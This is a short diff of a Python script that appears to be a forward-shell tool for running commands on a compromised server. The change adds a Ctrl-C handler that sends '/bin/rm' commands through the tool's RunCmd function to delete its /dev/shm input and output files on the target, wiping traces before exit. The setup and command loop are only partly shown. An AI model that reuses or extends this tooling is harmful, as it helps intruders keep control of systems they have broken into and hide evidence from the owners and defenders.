@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import requests, time, threading, pdb
+import requests, time, threading, pdb, signal, sys
 from base64 import b64encode
 from random import randrange
 
@@ -56,9 +56,22 @@ global stdin, stdout
 session = randrange(1000, 9999)
 stdin = "/dev/shm/input.%s" % (session)
 stdout = "/dev/shm/output.%s" % (session)
+erasestdin = """/bin/rm %s""" % (stdin)
+erasestdout = """/bin/rm %s""" % (stdout)
+
 SetupShell()
 
 ReadingTheThings = AllTheReads()
+
+def sig_handler(sig, frame):
+	print("\n\n[*] Exiting...\n")
+	print("[*] Removing files...\n")
+	RunCmd(erasestdin)
+	RunCmd(erasestdout)
+	print("[*] All files have been deleted\n")
+	sys.exit(0)
+
+signal.signal(signal.SIGINT, sig_handler)
 
 while True:
 	cmd = input("> ")
